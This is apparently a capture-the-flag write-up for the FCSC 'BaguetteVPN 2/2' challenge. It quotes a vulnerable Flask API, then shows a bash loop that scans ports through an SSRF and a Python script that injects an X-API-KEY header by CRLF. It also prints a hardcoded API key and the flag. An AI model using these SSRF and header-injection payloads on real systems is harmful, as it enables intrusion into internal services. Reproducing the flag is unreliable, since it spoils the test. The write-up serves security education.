## BaguetteVPN 2/2
### Points : *200*
### Description :
> Vous devez maintenant récupérer le secret contenu dans l'API. <br>
> Note : une petite énumération de ports (<2000) est autorisée pour ce challenge.


### Solution :
Inspecting the file `baguettevpn_server_app_v0.py` we found the following part in the script
```python
@app.route("/api/image")
def image():
    filename = request.args.get("fn")
    if filename:
        http = urllib3.PoolManager()
        return http.request('GET', 'http://baguette-vpn-cdn' + filename).data
    else:
        return Response('Paramètre manquant', status=400)

@app.route("/api/secret")
def admin():
    if request.remote_addr == '127.0.0.1':
        if request.headers.get('X-API-KEY') == 'b99cc420eb25205168e83190bae48a12':
            return jsonify({"secret": os.getenv('FLAG')})
        return Response('Interdit: mauvaise clé d\'API', status=403)
    return Response('Interdit: mauvaise adresse IP', status=403)
```

The `http.request` seems vulnerable to SSRF by passing `.localhost` at front of it. We use a bash loop in order to get the localport use.
```bash
for i in {0..2000}; do curl http://challenges2.france-cybersecurity-challenge.fr:5002/api/image?fn=.localhost:$i/api/secret; echo $i; done
```

So we found the following path : `curl http://challenges2.france-cybersecurity-challenge.fr:5002/api/image?fn=.localhost:1337/api/secret`. However we get an error `Interdit: mauvaise clé d'API`. We need to inject `X-API-KEY` header to the backend. 

CRLF injection of header: https://bugs.python.org/issue36276

```python
import requests

host = "challenges2.france-cybersecurity-challenge.fr:5002/api/image?fn=.localhost:1337/api/secret"
payload = " HTTP/1.1\r\nX-API-KEY: b99cc420eb25205168e83190bae48a12\r\nlocalhost:1337"
url = "http://" + host + payload
r = requests.get(url)
print(r.text)
```

Flag : `FCSC{6e86560231bae31b04948823e8d56fac5f1704aaeecf72b0c03bfe742d59fdfb}`
